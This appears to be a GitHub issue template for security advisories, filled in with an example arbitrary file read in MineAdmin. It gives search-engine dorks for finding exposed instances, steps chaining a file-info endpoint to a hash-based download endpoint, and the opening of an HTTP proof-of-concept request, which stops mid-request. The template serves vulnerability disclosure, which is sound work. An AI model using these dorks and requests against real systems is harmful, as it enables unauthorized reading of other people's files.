---
name: 🛡️ Security Advisory Template
about: Reporting original findings (e.g., Arbitrary File Read in MineAdmin)
title: '[Type] Component - Short Description'
labels: 'bug, security'
---

## 📝 Description
## 🎯 Impact
- **Target Component**: 
- **Affected Versions**: 
- **Vulnerability Type**: Arbitrary File Read / Information Disclosure
- **Severity**: High

## 🔍 Asset Discovery (Dorking)
- **FOFA / Hunter**: `body="MineAdmin"`, `app="MineAdmin"`

## 🛠️ Steps to Reproduce
1. Log in to the target system.
2. Send a request to the vulnerable endpoint: `/system/getFileInfoById?id=[ID]`
3. Observe the response containing the file `hash`.
4. Use the `/system/showFile/` or `/system/downloadByHash?hash=[HASH]` endpoint to access or download the file.

## 🚀 Proof of Concept (PoC)
```http
GET /system/getFileInfoById?id=43 HTTP/1.1
Host: {{target_host}}
Authorization: Bearer {{token}}
